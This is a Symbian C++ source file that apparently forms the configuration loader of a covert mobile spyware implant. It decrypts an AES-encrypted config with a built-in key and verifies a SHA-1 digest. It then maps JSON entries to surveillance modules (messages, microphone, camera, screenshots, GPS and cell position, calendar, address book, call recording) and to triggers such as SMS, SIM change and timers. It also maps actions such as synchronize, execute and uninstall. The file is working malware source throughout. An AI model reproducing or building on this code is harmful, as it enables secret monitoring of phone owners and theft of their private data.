#include "ConfigFile.h"
#include "Keys.h"
#include <S32FILE.H>
#include <bautils.h>
#include <HT\FileUtils.h>
#include <HT\ShaUtils.h>
#include <HT\AES.h>
#include <HT\LogFile.h>


/**
 * CActionData class holds the informations retrieved from the Config
 */
CDataAgent* CDataAgent::NewL(TAgentType aId, TAgentStatus aStatus, const TDesC8& buff)
	{
	CDataAgent* self = CDataAgent::NewLC(aId, aStatus, buff);
	CleanupStack::Pop(); // self;
	return self;
	}

CDataAgent* CDataAgent::NewLC(TAgentType aId, TAgentStatus aStatus, const TDesC8& buff)
	{
	CDataAgent* self = new (ELeave) CDataAgent(aId, aStatus);
	CleanupStack::PushL(self);
	self->ConstructL(buff);
	return self;
	}

CDataAgent::CDataAgent(TAgentType aId, TAgentStatus aStatus) :
	iId(aId), iStatus(aStatus), iAdditionalData(0)
	{
	}

CDataAgent::~CDataAgent()
	{
	iParams.Close();
	}

void CDataAgent::ConstructL(const TDesC8& buff)
	{
	iParams.Create(buff);
	}

/**
 * CActionData class holds the informations retrieved from the Config
 */
CDataAction* CDataAction::NewL(TActionType aId, const TDesC8& buff)
	{
	CDataAction* self = CDataAction::NewLC(aId, buff);
	CleanupStack::Pop(); // self;
	return self;
	}

CDataAction* CDataAction::NewLC(TActionType aId, const TDesC8& buff)
	{
	CDataAction* self = new (ELeave) CDataAction(aId);
	CleanupStack::PushL(self);
	self->ConstructL(buff);
	return self;
	}

CDataAction::CDataAction(TActionType aId) :
	iId(aId), iAdditionalData(0), iConditioned(EFalse)
	{
	}

CDataAction::~CDataAction()
	{
	iParams.Close();
	}

void CDataAction::ConstructL(const TDesC8& buff)
	{
	iParams.Create(buff);
	}

/**
 * CDataMacroAction class holds the informations retrieved from the Config
 */
CDataMacroAction* CDataMacroAction::NewL()
	{
	CDataMacroAction* self = CDataMacroAction::NewLC();
	CleanupStack::Pop(); // self;
	return self;
	}

CDataMacroAction* CDataMacroAction::NewLC()
	{
	CDataMacroAction* self = new (ELeave) CDataMacroAction();
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CDataMacroAction::~CDataMacroAction()
	{
	iActionsList.ResetAndDestroy();
	}

void CDataMacroAction::ConstructL()
	{
	iQueueId = ESecondaryQueue;
	}

void CDataMacroAction::AppendAction(CDataAction* aAction)
	{
	iActionsList.Append(aAction);
	}

/**
 * CDataAction class holds the informations retrieved from the Config
 */
CDataEvent* CDataEvent::NewL(TEventType aId, TUint32 aMacroIdx, const TDesC8& buff)
	{
	CDataEvent* self = CDataEvent::NewLC(aId, aMacroIdx, buff);
	CleanupStack::Pop(); // self;
	return self;
	}

CDataEvent* CDataEvent::NewLC(TEventType aId, TUint32 aMacroIdx, const TDesC8& buff)
	{
	CDataEvent* self = new (ELeave) CDataEvent(aId, aMacroIdx);
	CleanupStack::PushL(self);
	self->ConstructL(buff);
	return self;
	}

CDataEvent::CDataEvent(TEventType aId, TUint32 aMacroIdx) :
	iId(aId), iMacroActionIdx(aMacroIdx)
	{
	}

CDataEvent::~CDataEvent()
	{
	iParams.Close();
	}

void CDataEvent::ConstructL(const TDesC8& buff)
	{
	iParams.Create(buff);
	}

/**
 * COptionsData class holds the informations retrieved from the Config
 */
CDataOption* CDataOption::NewL(TOptionType aId, const TDesC8& buff)
	{
	CDataOption* self = CDataOption::NewLC(aId, buff);
	CleanupStack::Pop(); // self;
	return self;
	}

CDataOption* CDataOption::NewLC(TOptionType aId, const TDesC8& buff)
	{
	CDataOption* self = new (ELeave) CDataOption(aId);
	CleanupStack::PushL(self);
	self->ConstructL(buff);
	return self;
	}

CDataOption::CDataOption(TOptionType aId) :
	iId(aId)
	{
	}

CDataOption::~CDataOption()
	{
	iParams.Close();
	}

void CDataOption::ConstructL(const TDesC8& buff)
	{
	iParams.Create(buff);
	}

CConfigFile::CConfigFile()
	{
	// No implementation required
	}

CConfigFile::~CConfigFile()
	{
	__FLOG(_L8("Destructor"));
	Clear();
	iMacroActionsList.Close();
	iAgentsList.Close();
	iEventsList.Close();
	iOptionsList.Close();
	__FLOG(_L8("End Destructor"));
	}

CConfigFile* CConfigFile::NewLC()
	{
	CConfigFile* self = new (ELeave) CConfigFile();
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CConfigFile* CConfigFile::NewL()
	{
	CConfigFile* self = CConfigFile::NewLC();
	CleanupStack::Pop(); // self;
	return self;
	}

void CConfigFile::ConstructL()
	{
	__FLOG_OPEN("HT", "ConfigFile.txt");
	__FLOG(_L8("-------------"));
	}

void CConfigFile::Clear()
	{
	for (TInt i = 0; i < iMacroActionsList.Count(); i++)
		{
		iMacroActionsList[i]->iActionsList.ResetAndDestroy();
		}
	iMacroActionsList.ResetAndDestroy();
	iOptionsList.ResetAndDestroy();
	iEventsList.ResetAndDestroy();
	iAgentsList.ResetAndDestroy();
	}


HBufC8* CConfigFile::DecryptConfigFileL(RFs& fs, const TDesC& fname)
	{
	//understand if this is a new conf, useful for LogInfo
	TBool newConf = ETrue;
	if(fname.FindF(KTMP_CONFNAME) == KErrNotFound)
		{
		newConf = EFalse;
		}

	// 8.0 take 16 bytes from config key
	TBuf8<16> hexaKey(KAES_CONFIG_KEY().Left(16));
		
	__FLOG(_L8("DecryptConfigFileL Begin"));
	if (!BaflUtils::FileExists(fs, fname))
		return HBufC8::NewL(0);
	
	HBufC8* encryptedBuf = FileUtils::ReadFileContentsL(fs, fname);
	if(encryptedBuf->Size()==0)
		{
		delete encryptedBuf;
		if(newConf)
			{
			_LIT8(KError,"Unable to load config file into memory");
			LogInfoInvalidL(fs, KError);
			}
		return HBufC8::NewL(0);
		}
	CleanupStack::PushL(encryptedBuf);
	RBuf8 buf(AES::DecryptPkcs5L(*encryptedBuf,KIV,hexaKey));
	if(buf.Size() == 0)
		{
		if(newConf)
			{
			_LIT8(KError,"Invalid config file");
			LogInfoInvalidL(fs, KError);
			}
		buf.Close();
		CleanupStack::PopAndDestroy(encryptedBuf);
		return HBufC8::NewL(0);
		}
		
	//check sha1
	if(!ShaUtils::ValidateSha(buf.Left(buf.Size()-20),buf.Right(20)))
		{
		if(newConf)
			{
			_LIT8(KError,"Invalid config file");
			LogInfoInvalidL(fs, KError);
			}
		buf.Close();
		CleanupStack::PopAndDestroy(encryptedBuf);
		return HBufC8::NewL(0);
		}
	encryptedBuf->Des().Copy(buf.Left(buf.Size()-20));
	buf.Close();
	
	//TODO: delete when done with testing
	/*
	RFile file;
	TFullName filename(_L("C:\\Data\\Installs\\json.txt"));
	TInt err = file.Replace(fs, filename, EFileWrite | EFileStream | EFileShareAny);
	file.Write(*encryptedBuf);
	file.Flush();
	file.Close();
	*/
	//TODO: end delete when done

	CleanupStack::Pop(encryptedBuf);
	return encryptedBuf;
	}


TBool CConfigFile::LoadL(RFs& fs, const TDesC& filename)
	{
	__FLOG(_L8("LoadL"));
	TBool isValid = EFalse;
	RBuf configBuffer;
	
	HBufC8 *config = DecryptConfigFileL(fs,filename);
	
	// we need 16 bit for json lib
	if(config->Size()>0)
		{
		isValid = ETrue;
		TInt err = configBuffer.Create(2*(config->Size()));  
		if(err == KErrNone)
			configBuffer.Copy(*config);
		else
			{
			//TODO: log not enough memory
			isValid = EFalse;
			}
		}
	delete config;  // free mem as soon as possible
	
	if (isValid)
		{
		configBuffer.CleanupClosePushL();
		Clear();
		CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
		CleanupStack::PushL(jsonBuilder);
		
		jsonBuilder->BuildFromJsonStringL(configBuffer);
		CJsonObject* rootObject;
		jsonBuilder->GetDocumentObject(rootObject);
		if(rootObject)
			{
			CleanupStack::PushL(rootObject);
						
			//read modules list
			CJsonArray* modules;
			rootObject->GetArrayL(_L("modules"),modules);
			ReadModulesSectionL(modules);
			//read actions list
			CJsonArray* actions;
			rootObject->GetArrayL(_L("actions"),actions);
			ReadActionsSectionL(actions);
			//read events list
			CJsonArray* events;
			rootObject->GetArrayL(_L("events"),events);
			ReadEventsSectionL(events);

			CleanupStack::PopAndDestroy(rootObject);
			}
		else
			{
			isValid = EFalse;
			}
		CleanupStack::PopAndDestroy(jsonBuilder);
		CleanupStack::PopAndDestroy(&configBuffer);
		}

#ifdef _LOGGING
	__FLOG(_L8("Config Loaded!"));

	__FLOG(_L8("*** AGENTS:"));
	for (int i = 0; i < iAgentsList.Count(); i++)
		{
		CDataAgent* agent = iAgentsList[i];
		__FLOG_2(_L8("Id: %x	Status: %d"), agent->iId, agent->iStatus);
		}

	__FLOG(_L8("*** MACRO ACTIONS:"));
	for (int i = 0; i < iMacroActionsList.Count(); i++)
		{
		CDataMacroAction* macro = iMacroActionsList[i];
		__FLOG_2(_L8("Macro Indx: %d   ActionsCount:%d"), i, macro->iActionsList.Count());
		for (int j = 0; j < macro->iActionsList.Count(); j++)
			{
			CDataAction* action = macro->iActionsList[j];
			__FLOG_1(_L8("\tId: %x"), action->iId);
			}
		}

	__FLOG(_L8("*** EVENTS:"));
	for (int i = 0; i < iEventsList.Count(); i++)
		{
		CDataEvent* event = iEventsList[i];
		if(event->iMacroActionIdx != -1)
			{
			CDataMacroAction* macro = iMacroActionsList[event->iMacroActionIdx];
			__FLOG_2(_L8("Id: %x	ActionsCount: %d"), event->iId, macro->iActionsList.Count());
			for (int j = 0; j < macro->iActionsList.Count(); j++)
				{
				CDataAction* action = macro->iActionsList[j];
				__FLOG_1(_L8("\tId: %x"), action->iId);
				}
			}
		}

	__FLOG(_L8("*** OPTIONS:"));
	for (int i = 0; i < iOptionsList.Count(); i++)
		{
		CDataOption* option = iOptionsList[i];
		__FLOG_1(_L8("\tId: %x"), option->iId);
		}
#endif

	return isValid;
	}

void CConfigFile::ReadModulesSectionL(CJsonArray* aModulesArray)
	{
	iAgentsList.ResetAndDestroy();
	TInt numModules = 0;
	numModules = aModulesArray->Count();
	for(TInt i=0; i<numModules; i++)
		{
		TInt agentId = 0;
		TInt agentStatus = 1;  //1 = not active, 2 = active
		CJsonObject* module;
		aModulesArray->GetObject(i,module);
		if(module)
			{
			agentId = GetModuleId(module);
			
			if(agentId >0)
				{
				TInt additionalData = 0;
				if(agentId == EAgent_Call_TODO)
					{
					TBool record=EFalse;
					if(module->Find(_L("record")) != KErrNotFound)
						module->GetBoolL(_L("record"),record);
					if(record)
						additionalData = 1;
					}
				RBuf params;
				params.Create(420);
				params.CleanupClosePushL();
				module->ToStringL(params);
				TInt length = params.Length();
			
				RBuf8 params8;
				params8.Create(length);
				params8.CleanupClosePushL();
				params8.Copy(params);
				params.Close();
		
				// Add Agent to the List
				// and transfer the ownership
				if(agentId == EAgent_Call_TODO)
					{
					CDataAgent* newAgent = CDataAgent::NewL(EAgent_CallLocal, (TAgentStatus) agentStatus, params8);
					newAgent->iAdditionalData = additionalData; //1 if the agent must be started, 0 otherwise
					iAgentsList.Append(newAgent);
					CDataAgent* newAgent2 = CDataAgent::NewL(EAgent_CallList, (TAgentStatus) agentStatus, params8);
					iAgentsList.Append(newAgent2);
					}
				else
					{
					CDataAgent* newAgent = CDataAgent::NewL((TAgentType) agentId, (TAgentStatus) agentStatus, params8);
					iAgentsList.Append(newAgent);
					}
				CleanupStack::PopAndDestroy(2);  //params8,params
				}
			}
		}
	}

TInt CConfigFile::GetModuleId(CJsonObject* aObject)
	{
	TBuf<32> name;
	aObject->GetStringL(_L("module"), name);
	
	if(name.Compare(_L("messages")) == 0)
		return EAgent_Messages;
	if(name.Compare(_L("mic")) == 0)
		return EAgent_Mic;
	if(name.Compare(_L("device")) == 0)
		return EAgent_Device;
	if(name.Compare(_L("application"))==0)
		return EAgent_Application;
	if(name.Compare(_L("call")) == 0)
		return EAgent_Call_TODO;
	if(name.Compare(_L("camera"))==0)
		return EAgent_Cam;
	if(name.Compare(_L("screenshot")) == 0)
		return EAgent_Screenshot;
	if(name.Compare(_L("position")) == 0)
		return EAgent_Position;
	if(name.Compare(_L("calendar")) == 0)
		return EAgent_Calendar;
	if(name.Compare(_L("addressbook")) == 0)
		return EAgent_Addressbook;
	/*
	if(name.Compare(_L("livemic")) == 0)
		return 0;
	if(name.Compare(_L("chat"))==0)
		return 0;
	if(name.Compare(_L("url"))== 0)
		return 0;
	if(name.Compare(_L("keylog")) == 0)
		return 0;
	if(name.Compare(_L("clipboard")) == 0)
		return 0;
	if(name.Compare(_L("conference")) == 0)
		return 0;
	if(name.Compare(_L("crisis")) == 0)
		return 0;
	*/
	return 0;
	}


void CConfigFile::ReadEventsSectionL(const CJsonArray* aEventsArray)
	{
	iEventsList.ResetAndDestroy();

	TInt numEvents = 0;
	numEvents = aEventsArray->Count();
	
	for(TInt i=0; i<numEvents; i++)
		{
		CJsonObject* event = NULL;
		aEventsArray->GetObject(i,event);
		if(event)
			{
			TInt eventId = 0;
			TInt macroActionIdx = -1;
			if(event->Find(_L("start")) != KErrNotFound)
				{
				event->GetIntL(_L("start"),macroActionIdx);
				}
			eventId = GetEventId(event);
			RBuf params;
			params.Create(420);
			params.CleanupClosePushL();
			event->ToStringL(params);
			TInt length = params.Length();
						
			RBuf8 params8;
			params8.Create(length);
			params8.CleanupClosePushL();
			params8.Copy(params);
			params.Close();
					
			//if(eventId)
				//{
				// Add Event to the List
				// and transfer the ownership.
				CDataEvent* newEvent = CDataEvent::NewL((TEventType) eventId, macroActionIdx, params8);
				iEventsList.Append(newEvent);
				//}
			CleanupStack::PopAndDestroy(2);  //params8,params

			}
		}
	}

TInt CConfigFile::GetEventId(const CJsonObject* aObject)
	{
	TBuf<32> name;
	aObject->GetStringL(_L("event"),name);
	
	if(name.Compare(_L("date")) == 0)
		return EEvent_Date;
	if(name.Compare(_L("timer")) == 0)
		return EEvent_Timer;
	if(name.Compare(_L("sms")) == 0)
		return EEvent_Sms;
	if(name.Compare(_L("call")) == 0)
		return EEvent_Call;
	if(name.Compare(_L("connection")) == 0)
		return EEvent_Connection;
	if(name.Compare(_L("process")) == 0)
		return EEvent_Process;
	if(name.Compare(_L("simchange")) == 0)
		return EEvent_Sim_Change;
	if(name.Compare(_L("ac")) == 0)
		return EEvent_AC;
	if(name.Compare(_L("battery")) == 0)
		return EEvent_Battery;
	if(name.Compare(_L("standby")) == 0)
		return EEvent_Standby;
	if(name.Compare(_L("position")) == 0)
		{
		TBuf<12> type;
		aObject->GetStringL(_L("type"), type);
		
		if(type.Compare(_L("gps")) == 0)
			return EEvent_Location;
		if(type.Compare(_L("cell")) == 0)
			return EEvent_CellID;
		}
	
	return 0;
	}

void CConfigFile::ReadActionsSectionL(CJsonArray* aActionsArray)
	{
	iMacroActionsList.ResetAndDestroy();
	TInt numMacroActions = 0;
	numMacroActions = aActionsArray->Count();
	for(TInt i=0; i<numMacroActions; i++)
		{
		// conditioned = action must stop if sync param "stop" says so
		// conditioning = a sync that can stop all subsequent subactions if successfull
		TBool conditioned = EFalse;  //used to tell if this subaction is conditioned
		TBool first = EFalse;  //used to exclude the first conditioning sync
		
		CDataMacroAction* newMacroAction = CDataMacroAction::NewL();
		iMacroActionsList.Append(newMacroAction);

		CJsonObject* macroAction;
		aActionsArray->GetObject(i,macroAction);
		
		CJsonArray* subactionsArray;
		macroAction->GetArrayL(_L("subactions"),subactionsArray);
		
		TInt numSubActions=0;
		numSubActions = subactionsArray->Count(); 
		
		for(TInt j=0; j<numSubActions; j++)
			{
			CJsonObject* action;
			subactionsArray->GetObject(j,action);
			if(action)
				{
				TInt actionId=0;
				actionId = GetActionId(action);
				
				TInt additionalData = 0;
				if((actionId == EAction_StartAgent) || (actionId == EAction_StopAgent))
					{
					//retrieve agentId of agent to start/stop
					additionalData = GetModuleId(action);
					}
				if((actionId == EAction_Sync) || (actionId == EAction_SyncApn))
					{
					if(conditioned == EFalse)
						{
						// we only want to change to ETrue only the first time is requested
						TBool stopping = EFalse;
						action->GetBoolL((_L("stop")),stopping);
						if(stopping)
							{
							conditioned = ETrue;
							first = ETrue;
							}
						}
					}
				// set the queue id
				if((actionId==EAction_Uninstall) || (actionId == EAction_Sync) || (actionId == EAction_SyncApn))
					newMacroAction->iQueueId = EPrimaryQueue;
				else
					newMacroAction->iQueueId = ESecondaryQueue;
				
				RBuf params;
				params.Create(420);
				params.CleanupClosePushL();
				action->ToStringL(params);
				TInt length = params.Length();
										
				RBuf8 params8;
				params8.Create(length);
				params8.CleanupClosePushL();
				params8.Copy(params);
				params.Close();
				
				CDataAction* newAction = CDataAction::NewL((TActionType) actionId, params8);
				newAction->iTagId = (i << 16) | j;
				
				if((actionId==EAction_StartAgent) || (actionId == EAction_StopAgent))
					newAction->iAdditionalData = additionalData;
				
				if(first == EFalse)
					{
					//se non e' la prima sync condizionante
					newAction->iConditioned = conditioned;
					}
				first = EFalse; //restore false, so all subsequent subactions will be conditioned
				
				
				newMacroAction->AppendAction(newAction);
				
				CleanupStack::PopAndDestroy(2); //params,params8
				}
			}
		}
	}

TInt CConfigFile::GetActionId(CJsonObject* aObject)
	{
	
	TBuf<32> name;
	aObject->GetStringL(_L("action"),name); 
	if(name.Compare(_L("uninstall")) == 0)
		return EAction_Uninstall;
	if(name.Compare(_L("sms")) == 0)
		return EAction_Sms;
	if(name.Compare(_L("synchronize")) == 0)
		{
		if(aObject->Find(_L("apn"))!= KErrNotFound)
			{
			//TODO: remove this check when base conf is well configured
			CJsonObject* apnObject;
			aObject->GetObjectL(_L("apn"),apnObject);
			TBuf<64> apnName;
			apnObject->GetStringL(_L("name"),apnName);
			if(apnName.Compare(KNullDesC) == 0)
				return EAction_Sync;
			else
				return EAction_SyncApn;
			}
		else
			return EAction_Sync;
		}
	if(name.Compare(_L("module")) == 0)
		{		
		return EAction_Agent;
		}
	if(name.Compare(_L("event")) == 0)
		{
		return EAction_Event;
		}
	if(name.Compare(_L("log")) == 0)
		return EAction_Log;
	if(name.Compare(_L("execute")) == 0)
		return EAction_Execute_TODO;
	return 0;
	}

CDataAgent* CConfigFile::FindDataAgent(TAgentType aAgentId)
	{
	for (int i = 0; i < iAgentsList.Count(); i++)
		if (aAgentId == iAgentsList[i]->iId)
			return iAgentsList[i];
	return NULL;
	}

void CConfigFile::LogInfoInvalidL(RFs& aFs, const TDesC8& aLogMsg)
	{
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	buffer->InsertL(buffer->Size(),(TUint8*)aLogMsg.Ptr(),aLogMsg.Size());
	HBufC8* byteBuf = buffer->Ptr(0).AllocLC();
	CLogFile* logFile = CLogFile::NewLC(aFs);
	logFile->CreateLogL(LOGTYPE_INFO);
	logFile->AppendLogL(*byteBuf);
	logFile->CloseLogL();
	CleanupStack::PopAndDestroy(logFile);
	CleanupStack::PopAndDestroy(byteBuf);
	CleanupStack::PopAndDestroy(buffer);
	}
